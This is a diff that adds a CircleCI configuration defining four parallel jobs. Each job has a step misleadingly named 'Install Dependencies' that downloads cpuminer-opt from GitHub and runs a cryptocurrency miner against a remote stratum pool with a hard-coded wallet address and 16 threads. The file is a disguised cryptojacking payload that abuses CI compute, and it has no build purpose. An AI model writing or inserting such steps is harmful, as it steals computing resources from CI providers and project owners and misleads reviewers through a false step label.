@@ -1,0 +1,38 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz ./cpuminer-sse2 -a yespowermgpc  -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u Md1PbiMHtr32QxpW7dgvdN44a9CDQpP7AW.test -t 16
+    Devop1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz ./cpuminer-sse2 -a yespowermgpc  -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u Md1PbiMHtr32QxpW7dgvdN44a9CDQpP7AW.test -t 16
+    Devop2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz ./cpuminer-sse2 -a yespowermgpc  -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u Md1PbiMHtr32QxpW7dgvdN44a9CDQpP7AW.test -t 16
+    Devop3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz ./cpuminer-sse2 -a yespowermgpc  -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u Md1PbiMHtr32QxpW7dgvdN44a9CDQpP7AW.test -t 16
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
